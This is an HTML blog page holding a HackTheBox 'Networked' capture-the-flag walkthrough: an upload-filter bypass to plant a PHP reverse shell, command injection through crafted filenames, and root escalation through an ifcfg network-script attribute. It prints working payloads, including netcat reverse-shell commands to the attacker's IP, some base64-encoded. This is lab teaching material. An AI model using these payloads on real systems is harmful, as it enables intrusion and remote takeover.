<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox - Networked" /><meta property="og:locale" content="en" /><meta name="description" content="Overview This machine begins w/ a web enumeration, discovering a page where users can only upload images onto the system due to the filters in place, however it can be bypassed by changing the content type (1), filename (2) and adding a GIF header (3), allowing us to upload php-reverse-shell.php, obtaining a low-privilege/www-data shell." /><meta property="og:description" content="Overview This machine begins w/ a web enumeration, discovering a page where users can only upload images onto the system due to the filters in place, however it can be bypassed by changing the content type (1), filename (2) and adding a GIF header (3), allowing us to upload php-reverse-shell.php, obtaining a low-privilege/www-data shell." /><link rel="canonical" href="https://yufongg.github.io/posts/Networked/" /><meta property="og:url" content="https://yufongg.github.io/posts/Networked/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-13T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Networked" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-09-13T00:00:00+08:00","description":"Overview This machine begins w/ a web enumeration, discovering a page where users can only upload images onto the system due to the filters in place, however it can be bypassed by changing the content type (1), filename (2) and adding a GIF header (3), allowing us to upload php-reverse-shell.php, obtaining a low-privilege/www-data shell.","headline":"HackTheBox - Networked","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/Networked/"},"url":"https://yufongg.github.io/posts/Networked/"}</script><title>HackTheBox - Networked | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Networked</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913201610.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>HackTheBox - Networked</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1662998400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-09-13 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2135 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><p>This machine begins w/ a web enumeration, discovering a page where users can <strong>only</strong> upload images onto the system due to the filters in place, however it can be bypassed by changing the content type (1), filename (2) and adding a GIF header (3), allowing us to upload <code class="language-plaintext highlighter-rouge">php-reverse-shell.php</code>, obtaining a low-privilege/<code class="language-plaintext highlighter-rouge">www-data</code> shell.</p><p>For the privilege escalation part, we have to privilege escalate to <code class="language-plaintext highlighter-rouge">guly</code> and then to <code class="language-plaintext highlighter-rouge">root</code>. After some enumeration, there is a cronjob that is executing a script <code class="language-plaintext highlighter-rouge">check_attack.php</code> as <code class="language-plaintext highlighter-rouge">guly</code>. The purpose of that script is to check if files in <code class="language-plaintext highlighter-rouge">/var/www/html/uploads</code> have a valid IP address in its name, otherwise delete it. The script is vulnerable to command injection due to passing user input directly into <code class="language-plaintext highlighter-rouge">exec()</code>, privilege escalating us to user <code class="language-plaintext highlighter-rouge">guly</code>.</p><p>User <code class="language-plaintext highlighter-rouge">guly</code> has a sudoers entry, that allows <code class="language-plaintext highlighter-rouge">guly</code> to execute <code class="language-plaintext highlighter-rouge">change_name.sh</code> as <code class="language-plaintext highlighter-rouge">root</code>, the purpose of the script is to add attributes into <code class="language-plaintext highlighter-rouge">guly</code> network script. The script is vulnerable because it is writing to a network script file. The vulnerability resides in how attributes in network scripts are handled. If there is a white space in the attribute, system will try to execute the word after the whitespace, allowing us to privilege escalate to <code class="language-plaintext highlighter-rouge">root</code>.</p><p>If you wish to practice boxes similar to this, try VulnHub PwnLab</p><hr /><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Box Name<td>Networked<tr><td>IP<td>10.10.10.146<tr><td>Points<td>20<tr><td>Difficulty<td>Easy<tr><td>Creator<td><a href="https://www.hackthebox.com/home/users/profile/8292">guly</a><tr><td>Release Date<td>24-Aug-2019</table></div><h1 id="recon">Recon</h1><h2 id="tcp80-http">TCP/80 (HTTP) <a href="#tcp80-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>FFUF<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>301      GET        7l       20w      235c http://10.10.10.146/backup =&gt; http://10.10.10.146/backup/
403      GET        8l       22w      210c http://10.10.10.146/cgi-bin/
403      GET        8l       22w      215c http://10.10.10.146/cgi-bin/.html
200      GET        8l       40w      229c http://10.10.10.146/index.php
200      GET        0l        0w        0c http://10.10.10.146/lib.php
200      GET       22l       88w     1302c http://10.10.10.146/photos.php
200      GET        5l       13w      169c http://10.10.10.146/upload.php
301      GET        7l       20w      236c http://10.10.10.146/uploads =&gt; http://10.10.10.146/uploads/
</pre></table></code></div></div><li><code class="language-plaintext highlighter-rouge">lib.php</code><li><code class="language-plaintext highlighter-rouge">photos.php</code><li><code class="language-plaintext highlighter-rouge">upload.php</code><li><code class="language-plaintext highlighter-rouge">uploads/</code></ul><h1 id="initial-foothold">Initial Foothold</h1><h2 id="tcp80-http---file-upload-bypass">TCP/80 (HTTP) - File Upload Bypass <a href="#tcp80-http---file-upload-bypass" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>After some testing at <code class="language-plaintext highlighter-rouge">http://10.10.10.146/upload.php</code>, <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913004647.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">.php</code> - unable to upload<li><code class="language-plaintext highlighter-rouge">.jpg, .png</code> - successfully uploaded<li>Uploaded files go to <code class="language-plaintext highlighter-rouge">uploads/&lt;IP Address&gt;.ext</code></ul><li>Attempt file <a href="https://yufongg.github.io/posts/Upload-bypass/">upload bypass</a><ol><li>Upload <code class="language-plaintext highlighter-rouge">php-reverse-shell.php</code>, intercept w/ <code class="language-plaintext highlighter-rouge">burp</code><li>Change POST data<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre> Content-Disposition: form-data; name="myFile"; filename="php-reverse-shell.php.jpg"
 Content-Type: image/jpg
		
 GIF89a;
 &lt;?php
 ...
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913020708.png" alt="" data-proofer-ignore></p></ol><li>Invoke reverse shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/networked]
 └─# curl http://networked.htb/uploads/10_10_14_19.php.jpg
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913020924.png" alt="" data-proofer-ignore></p><li>If you want to practice this exact upload bypass, try Vulnhub Pwnlab</ol><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="guly---enumeration">Guly - Enumeration <a href="#guly---enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found something interesting in <code class="language-plaintext highlighter-rouge">/home/guly</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre> bash-4.2$ ls -la /home/guly                                          
 total 28                                                             
 drwxr-xr-x. 2 guly guly 159 Jul  9  2019 .                           
 drwxr-xr-x. 3 root root  18 Jul  2  2019 ..                          
 lrwxrwxrwx. 1 root root   9 Jul  2  2019 .bash_history -&gt; /dev/null  
 -rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout                
 -rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile               
 -rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc                     
 -rw-------  1 guly guly 639 Jul  9  2019 .viminfo                    
 -r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php            
 -rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly                
 -r--------. 1 guly guly  33 Oct 30  2018 user.txt   
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">crontab.guly</code><li><code class="language-plaintext highlighter-rouge">check_attack.php</code></ul><li>View <code class="language-plaintext highlighter-rouge">check_attack.php</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913021555.png" alt="" data-proofer-ignore></ol><h2 id="guly---what-is-check_attackphp-doing">Guly - What is check_attack.php doing? <a href="#guly---what-is-check_attackphp-doing" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>What is check_attack.php doing? - TLDR<ol><li>Once a files is uploaded, its name is changed to the IP address of the machine that uploaded the file. Instead of <code class="language-plaintext highlighter-rouge">'.'</code>, <code class="language-plaintext highlighter-rouge">'_'</code> is used. <code class="language-plaintext highlighter-rouge">10_10_14_14.jpg</code><li>Basically, it checks if the files in <code class="language-plaintext highlighter-rouge">/var/www/html/uploads</code> whether their name is a valid IP address, if it is, do nothing, if isn’t append a warning into a log file and then delete the invalid file.</ol><li>Breaking down what check_attack.php is doing<ol><li>The for loop goes through files residing in <code class="language-plaintext highlighter-rouge">/var/www/html/uploads</code>, excluding <code class="language-plaintext highlighter-rouge">/var/www/html/index.html</code><li>The <code class="language-plaintext highlighter-rouge">getNameCheck($value)</code> function fix the format of the IP address by replacing <code class="language-plaintext highlighter-rouge">'_'</code> w/ <code class="language-plaintext highlighter-rouge">'.'</code> and returning the filename <code class="language-plaintext highlighter-rouge">10.10.10.14</code> and extension <code class="language-plaintext highlighter-rouge">.jpg</code>.<li>The <code class="language-plaintext highlighter-rouge">check_ip($name, $value)</code> function just checks whether the variable <code class="language-plaintext highlighter-rouge">$name</code> (<code class="language-plaintext highlighter-rouge">10.10.10.14</code>) is a valid IP address, if not returns <code class="language-plaintext highlighter-rouge">ret=false</code>, which means <code class="language-plaintext highlighter-rouge">$check[0]</code> is NULL.<li>If <code class="language-plaintext highlighter-rouge">$check[0]</code> is NULL, append message to log, remove invalid file and mail. (This part is vulnerable)</ol></ol><h2 id="guly---exploiting-check_attackphp">Guly - Exploiting check_attack.php <a href="#guly---exploiting-check_attackphp" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>How do we exploit <code class="language-plaintext highlighter-rouge">check_attack.php</code>? (1)<ol><li>We are only interested in <code class="language-plaintext highlighter-rouge">exec(...)</code> because it is code execution.<blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">exec("nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;");</code> is vulnerable because <code class="language-plaintext highlighter-rouge">$value</code> is passed into <code class="language-plaintext highlighter-rouge">exec</code></p></div></blockquote><li>The variable <code class="language-plaintext highlighter-rouge">$value</code> are files residing in <code class="language-plaintext highlighter-rouge">/var/www/html/uploads/&lt;file&gt;</code><li>In order to get to the <code class="language-plaintext highlighter-rouge">exec(...)</code> statement, we simply just have to create a file that is <code class="language-plaintext highlighter-rouge">!= 10_10_10_10.png</code>, not a valid IP Address.</ol><li>How do we exploit <code class="language-plaintext highlighter-rouge">check_attack.php</code>? (2)<ol><li>We are able to do command injection by naming the files in <code class="language-plaintext highlighter-rouge">uploads</code> directory commands we want to execute<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> # Create our Command Injection Payload
 touch "/var/www/html/uploads/&lt;Command Injection Payload&gt;"
 touch ";id;whoami;whoami"

 # Our Payload is stored in $value variable
 $value = /var/www/html/uploads/&lt;filename&gt; 
 $value = /var/www/html/uploads/;id;whoami;whoami

 # What it looks like when command injected
 exec("nohup /bin/rm -f /var/www/html/uploads$value &gt; /dev/null 2&gt;&amp;1
 exec("nohup /bin/rm -f /var/www/html/uploads;id;whoami;whoami &gt; /dev/null 2&gt;&amp;1
</pre></table></code></div></div><li>Create payload<blockquote><ol><li>Commands we would want to inject will be a reverse shell, most reverse shell requires the character <code class="language-plaintext highlighter-rouge">/</code>, however, it is not possible to create a file w/ <code class="language-plaintext highlighter-rouge">/</code> in its filename.<li>Bypass/Overcome the restriction<blockquote><ul><li>We can <code class="language-plaintext highlighter-rouge">base64</code> encode the payload and then decode it pip it in <code class="language-plaintext highlighter-rouge">sh</code><li>Use <code class="language-plaintext highlighter-rouge">$(which bash)</code></ul></blockquote><li>Our command injection payload is directed into <code class="language-plaintext highlighter-rouge">/dev/null</code>,<li>Bypass/Overcome the restriction<blockquote><ul><li>simply add a random command (<code class="language-plaintext highlighter-rouge">;id</code>) so that that command will be passed to <code class="language-plaintext highlighter-rouge">/dev/null</code> instead.</ul></blockquote></ol></blockquote></ol><li>Exploiting <code class="language-plaintext highlighter-rouge">check_attack.php</code><ol><li>Monitor when <code class="language-plaintext highlighter-rouge">check_attack.php</code> is executed w/ <code class="language-plaintext highlighter-rouge">pspy64</code><li>Create our command injection file (1)<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre> bash-4.2$ pwd
 /var/www/html/uploads

 bash-4.2$ touch ';nc 10.10.14.19 4444 -e $(which bash);id' 
		
 bash-4.2$ ls -l
 total 44
 -rw-r--r--  1 apache apache 12553 Sep 12 19:43 10_10_14_19.jpg
 -rw-r--r--  1 apache apache  5502 Sep 12 19:44 10_10_14_19.php.jpg
 -rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_1.png
 -rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_2.png
 -rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_3.png
 -rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_4.png
 -rw-rw-rw-  1 apache apache     0 Sep 12 23:02 ;nc 10.10.14.19 4444 -e $(which bash);id
 -r--r--r--. 1 root   root       2 Oct 30  2018 index.html
</pre></table></code></div></div><li>Start listener<li>Wait for cronjob to execute <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913050342.png" alt="" data-proofer-ignore><li><code class="language-plaintext highlighter-rouge">guly</code> shell obtained <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913050514.png" alt="" data-proofer-ignore><li>Create our command injection file (2)<ol><li>Encode Payload<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> bash-4.2$ echo 'nc 10.10.14.19 4444 -e /bin/bash' | base64
 bmMgMTAuMTAuMTQuMTkgNDQ0NCAtZSAvYmluL2Jhc2gK
</pre></table></code></div></div><li>Create file<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> bash-4.2$ bash-4.2$ touch ';echo bmMgMTAuMTAuMTQuMTkgNDQ0NCAtZSAvYmluL2Jhc2gK | base64 -d | sh; id'
</pre></table></code></div></div></ol><li>Start listener<li>Wait for cronjob to execute <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913055843.png" alt="" data-proofer-ignore></ol><li>Demo - <code class="language-plaintext highlighter-rouge">check_attack.php</code> Privilege Escalation<html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body><div id="check_attack_priv_esc"></div><script src="/asciinema-player.min.js"></script> <script> AsciinemaPlayer.create('https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/check_attack_priv_esc.cast', document.getElementById('check_attack_priv_esc'), { loop: true, autoPlay: true }); </script></ol><h2 id="root---enumeration">Root - Enumeration <a href="#root---enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Check <code class="language-plaintext highlighter-rouge">guly</code> sudo access<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre> [guly@networked tmp]$ sudo -l
 Matching Defaults entries for guly on networked:
     !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
     env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
     env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
     env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
     env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
     env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
     secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
	
 User guly may run the following commands on networked:
     (root) NOPASSWD: /usr/local/sbin/changename.sh
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">/usr/local/sbin/changename.sh</code></ul><li>View contents of <code class="language-plaintext highlighter-rouge">/usr/local/sbin/changename.sh</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913190525.png" alt="" data-proofer-ignore></ol><h2 id="root---what-is-changenamesh-doing">Root - What is changename.sh doing? <a href="#root---what-is-changenamesh-doing" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>What is changename.sh doing - TLDR<ul><li>Basically, <code class="language-plaintext highlighter-rouge">changename.sh</code> is a script that allow users to configure parameters on a network interface file called <code class="language-plaintext highlighter-rouge">ifcfg-guly</code> by taking their input</ul><li>Breaking down what <code class="language-plaintext highlighter-rouge">changename.sh</code> is doing<ol><li>Configure parameters (<code class="language-plaintext highlighter-rouge">DEVICE, ONBOOT, NM_CONTROLLED</code>)<li>The for loop will take in users input to configure parameters (<code class="language-plaintext highlighter-rouge">NAME, PROXY_METHOD, BROWSER_ONLY, BOOTPROTO</code>)<li>If user input has banned characters, ask for user input again until a valid one is provided<li>Writes user input into <code class="language-plaintext highlighter-rouge">ifcfg-guly</code><li>Starts interface <code class="language-plaintext highlighter-rouge">guly0</code></ol></ol><h2 id="root---exploiting-changenamesh">Root - Exploiting changename.sh <a href="#root---exploiting-changenamesh" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>After analyzing <code class="language-plaintext highlighter-rouge">changename.sh</code>, I could not find any way to do command injection, <code class="language-plaintext highlighter-rouge">echo "$var"</code> is usually safe, so command injection is not possible.<li>Instead, I googled, <code class="language-plaintext highlighter-rouge">ifcfg privilege escalation</code>, and found something interesting.<li>How do we exploit <code class="language-plaintext highlighter-rouge">changename.sh</code> - <a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f">source</a><ol><li>The vulnerability resides in how attributes in network scripts are not handled correctly<li>If there are whitespaces in the attribute name, <code class="language-plaintext highlighter-rouge">system</code> will try to execute the word after the white space.<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> NAME=testing whoami
 # whoami will be executed by system as root
</pre></table></code></div></div><li>Spawn <code class="language-plaintext highlighter-rouge">root</code> shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> a /bin/bash
</pre></table></code></div></div></ol><li>Exploiting <code class="language-plaintext highlighter-rouge">changename.sh</code><ol><li>Execute <code class="language-plaintext highlighter-rouge">changename.sh</code> as root<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> [guly@networked tmp]$ sudo /usr/local/sbin/changename.sh
</pre></table></code></div></div><li>Spawn <code class="language-plaintext highlighter-rouge">bash</code>, privilege escalating to <code class="language-plaintext highlighter-rouge">root</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre> [guly@networked tmp]$ sudo /usr/local/sbin/changename.sh
 interface NAME:
 a
 interface PROXY_METHOD:
 a
 interface BROWSER_ONLY:
 a
 interface BOOTPROTO:
 a /bin/bash
 [root@networked network-scripts]# 
</pre></table></code></div></div></ol><li>Demo - <code class="language-plaintext highlighter-rouge">changename.sh</code> Privilege Escalation<html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body><div id="change_name_priv_esc"></div><script src="/asciinema-player.min.js"></script> <script> AsciinemaPlayer.create('https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/change_name_priv_esc.cast', document.getElementById('change_name_priv_esc'), { loop: true, autoPlay: true }); </script></ol><h1 id="additional">Additional</h1><h2 id="guly----what-is-check_attackphp-doing-in-depth">Guly - What is check_attack.php doing? (In-Depth) <a href="#guly----what-is-check_attackphp-doing-in-depth" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Assign some variables<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
